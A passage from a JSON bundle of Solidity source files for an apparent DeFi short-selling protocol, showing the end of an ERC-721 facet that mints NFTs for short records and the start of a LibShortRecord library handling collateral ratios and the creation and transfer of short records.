shortRecords\n     *\n     * @param asset The market that will be impacted\n     * @param shortRecordId Id of active shortRecord\n     */\n\n    function mintNFT(address asset, uint8 shortRecordId)\n        external\n        isNotFrozen(asset)\n        nonReentrant\n        onlyValidShortRecord(asset, msg.sender, shortRecordId)\n    {\n        if (shortRecordId == Constants.SHORT_MAX_ID) {\n            revert Errors.CannotMintLastShortRecord();\n        }\n        STypes.ShortRecord storage short =\n            s.shortRecords[asset][msg.sender][shortRecordId];\n\n        if (short.tokenId != 0) revert Errors.AlreadyMinted();\n\n        s.nftMapping[s.tokenIdCounter] = STypes.NFT({\n            owner: msg.sender,\n            assetId: s.asset[asset].assetId,\n            shortRecordId: shortRecordId\n        });\n\n        short.tokenId = s.tokenIdCounter;\n\n        //@dev never decreases\n        s.tokenIdCounter += 1;\n    }\n\n    function tokenURI(uint256 id) public view virtual returns (string memory) {}\n\n    /**\n     * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target address.\n     * The call is not executed if the target address is not a contract.\n     *\n     * @param from address representing the previous owner of the given token ID\n     * @param to target address that will receive the tokens\n     * @param tokenId uint256 ID of the token to be transferred\n     * @param data bytes optional data to send along with the call\n     * @return bool whether the call correctly returned the expected magic value\n     */\n    function _checkOnERC721Received(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) private returns (bool) {\n        if (to.code.length > 0) {\n            try IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, data)\n            returns (bytes4 retval) {\n                return retval == IERC721Receiver.onERC721Received.selector;\n            } catch (bytes memory reason) {\n                if (reason.length == 0) {\n                    revert Errors.ERC721InvalidReceiver(to);\n                } else {\n                    /// @solidity memory-safe-assembly\n                    // solhint-disable-next-line no-inline-assembly\n                    assembly {\n                        revert(add(32, reason), mload(reason))\n                    }\n                }\n            }\n        } else {\n            return true;\n        }\n    }\n\n    // This implements ERC-165 (copied from DiamondLoupeFacet.sol)\n    function supportsInterface(bytes4 _interfaceId) external view returns (bool) {\n        LibDiamond.DiamondStorage storage ds = LibDiamond.diamondStorage();\n        return ds.supportedInterfaces[_interfaceId];\n    }\n}"
    },
    {
      "filename": "contracts/libraries/LibShortRecord.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.21;\n\nimport {U256, U88, U80} from \"contracts/libraries/PRBMathHelper.sol\";\n\nimport {STypes, SR} from \"contracts/libraries/DataTypes.sol\";\nimport {Errors} from \"contracts/libraries/Errors.sol\";\nimport {Events} from \"contracts/libraries/Events.sol\";\nimport {AppStorage, appStorage} from \"contracts/libraries/AppStorage.sol\";\nimport {Constants} from \"contracts/libraries/Constants.sol\";\nimport {LibAsset} from \"contracts/libraries/LibAsset.sol\";\nimport {LibOrders} from \"contracts/libraries/LibOrders.sol\";\nimport {LibOracle} from \"contracts/libraries/LibOracle.sol\";\n\n// import {console} from \"contracts/libraries/console.sol\";\n\nlibrary LibShortRecord {\n    using U256 for uint256;\n    using U88 for uint88;\n    using U80 for uint80;\n\n    function getCollateralRatio(STypes.ShortRecord memory short, address asset)\n        internal\n        view\n        returns (uint256 cRatio)\n    {\n        return short.collateral.div(short.ercDebt.mul(LibOracle.getPrice(asset)));\n    }\n\n    function getCollateralRatioSpotPrice(\n        STypes.ShortRecord memory short,\n        uint256 oraclePrice\n    ) internal pure returns (uint256 cRatio) {\n        return short.collateral.div(short.ercDebt.mul(oraclePrice));\n    }\n\n    /**\n     * @notice Returns number of active shortRecords\n     *\n     * @param asset The market that will be impacted\n     * @param shorter Shorter address\n     *\n     * @return shortRecordCount\n     */\n    function getShortRecordCount(address asset, address shorter)\n        internal\n        view\n        returns (uint256 shortRecordCount)\n    {\n        AppStorage storage s = appStorage();\n\n        // Retrieve first non-HEAD short\n        uint8 id = s.shortRecords[asset][shorter][Constants.HEAD].nextId;\n        if (id <= Constants.HEAD) {\n            return 0;\n        }\n\n        while (true) {\n            shortRecordCount++;\n            // One short of one shorter in this order book\n            STypes.ShortRecord storage currentShort = s.shortRecords[asset][shorter][id];\n            // Move to next short unless this is the last one\n            if (currentShort.nextId > Constants.HEAD) {\n                id = currentShort.nextId;\n            } else {\n                return shortRecordCount;\n            }\n        }\n    }\n\n    function createShortRecord(\n        address asset,\n        address shorter,\n        SR status,\n        uint88 collateral,\n        uint88 ercAmount,\n        uint64 ercDebtRate,\n        uint80 zethYieldRate,\n        uint40 tokenId\n    ) internal returns (uint8 id) {\n        AppStorage storage s = appStorage();\n\n        // ensure the tokenId can be downcasted to 40 bits\n        if (tokenId > type(uint40).max) revert Errors.InvalidTokenId();\n\n        uint8 nextId;\n        (id, nextId) = setShortRecordIds(asset, shorter);\n\n        if (id <= Constants.SHORT_MAX_ID) {\n            s.shortRecords[asset][shorter][id] = STypes.ShortRecord({\n                prevId: Constants.HEAD,\n                id: id,\n                nextId: nextId,\n                status: status,\n                collateral: collateral,\n                ercDebt: ercAmount,\n                ercDebtRate: ercDebtRate,\n                zethYieldRate: zethYieldRate,\n                flaggerId: 0,\n                tokenId: tokenId,\n                updatedAt: LibOrders.getOffsetTimeHours()\n            });\n            emit Events.CreateShortRecord(asset, shorter, id);\n        } else {\n            // All shortRecordIds used, combine into max shortRecordId\n            id = Constants.SHORT_MAX_ID;\n            fillShortRecord(\n                asset,\n                shorter,\n                id,\n                status,\n                collateral,\n                ercAmount,\n                ercDebtRate,\n                zethYieldRate\n            );\n        }\n    }\n\n    function transferShortRecord(\n        address asset,\n        address from,\n        address to,\n        uint40 tokenId,\n        STypes.NFT memory nft\n    ) internal {\n        AppStorage storage s = appStorage();\n        STypes.ShortRecord storage short = s.shortRecords[asset][from][nft.shortRecordId];\n        if (short.status == SR.Cancelled) revert Errors.OriginalShortRecordCancelled();\n        if (short.flaggerId != 0) revert Errors.CannotTransferFlaggedShort();\n\n        deleteShortRecord(asset, from, nft.shortRecordId);\n\n        uint8 id = createShortRecord(\n            asset,\n            to,\n            SR.FullyFilled,\n            short.collateral,\n            short.ercDebt,\n            short.ercDebtRate,\n            short.zethYieldRate,\n            tokenId\n        );\n\n        if (id == Constants.SHORT_MAX_ID) {\n            revert Errors.ReceiverExceededShortRecordLimit();\n        }\n\n        s.nftMapping[tokenId].owner = to;\n        s.nftMapping[tokenId].shortRecordId = id;\n    }\n\n    function fillShortRecord(\n        address asset,\n        address shorter,\n        uint8 shortId,\n        SR status,\n        uint88 collateral,\n        uint88 ercAmount,"
    }
  ]
}